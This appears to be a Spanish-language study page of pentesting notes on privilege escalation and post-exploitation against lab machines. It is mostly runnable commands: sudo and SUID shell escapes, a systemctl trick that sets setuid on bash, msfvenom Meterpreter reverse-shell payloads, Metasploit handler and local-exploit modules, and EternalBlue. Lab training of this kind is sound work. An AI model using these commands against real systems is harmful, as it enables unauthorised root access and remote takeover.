---
icon: '7'
---

# Escalada de Privilegios + Post Explotación

## Escalada de Privilegios en Linux – Sudo -l

{% embed url="https://hackmyvm.eu/machines/machine.php?vm=Friendly" %}

Subimos el payload a través del protocolo FTP. Nos ponemos en escucha mientras carga la página para la **Reverse Shell**. Hacemos tratamiento de la **TTY**.&#x20;

{% embed url="https://gtfobins.github.io/" %}

```bash
sudo -l
```

Con el comando proporcionado en la página debemos de poner la ruta absoluta.

## Escalada de Privilegios en Linux – Sudo -l | Parte 2

{% embed url="https://tryhackme.com/room/brooklynninenine" %}

{% embed url="https://gtfobins.github.io/gtfobins/less/#suid" %}

```bash
sudo -l 
sudo /usr/bin/less /etc/profile
!/bin/sh
```

## Escalada de Privilegios en Linux – Binarios SUID

{% embed url="https://tryhackme.com/room/vulnversity" %}

Otra técnica muy frecuente para escalar privilegios en Linux es la enumeración de binarios **SUID**, donde podremos conocer que binarios tienen **setuid 0** y podemos utilizarlos para escalar privilegios en Linux.

```bash
find / -perm -4000 2>/dev/null
```

En el directorio `/tmp`, creamos un archivo en **bash** con este contenido.

```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod u+s /in/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

Ejecutamos.

```bash
bash archivo.sh
```

Hemos abusado de un binario. Ya somos **root**.

```bash
bash -p
```

## Escalada de Privilegios en Linux – Binarios SUID | Parte 2

{% embed url="https://vulnyx.com/#basic" %}

```
find / -perm -4000 2>/dev/null
```

{% embed url="https://gtfobins.github.io/gtfobins/env/" %}

```bash
env /bin/sh -p
```

## Escalada de Privilegios Automática con Metasploit en Linux & Windows

{% embed url="https://drive.google.com/file/d/11oWEHwqu9AOKNwBU483abdGhnxJaZKT5/view?usp=sharing" %}

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP máquina atacante> LPORT=4444 -f exe -o virus.exe
```

Si no es de 64 bits.

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP máquina atacante> LPORT=4444 -f exe -o virus.exe
```

Lo compartimos en un servidor en Python.

```bash
python3 -m http.server 80
```

Ponemos la IP en el buscador y nos descargamos el Python. Nos ponemos en escucha mediante **Metasploit**.

```
msfconsole
use multi/handler
show options
set LHOST <IP máquina atacante>
set PAYLOAD windows/meterpreter/reverse_tcp
run 
```

Ejecutamos nuestro payload. Somos un usuario normal por lo que hay que escalar privilegios.

```bash
background 
search local_exploit_suggester
show options
sessions -l
set SESSION 1 
run
```

Nos salen los exploits operativos pero hay que probar uno a uno.

```bash
use windows/local/tokenmagic
show options
set SESSION 1
set LHOST <IP máquina atacante>
set LPORT 5555
run
```

## Enumeración de Usuarios en Sistemas Windows

{% embed url="https://mega.nz/file/zIBTHZjT#IOsj05Xn0R4n7vlGy_gv0wvFJ1aZFT5uSW3nXK6KmD0" %}

```bash
msfconsole 
search eternalblue 
use 0
show options
set RHOSTS <IP máquina víctima>
run
```

En meterpreter.

```bash
shell
net users
```

El comando `net users` para poder ver los usuarios existentes dentro de un sistema Windows.
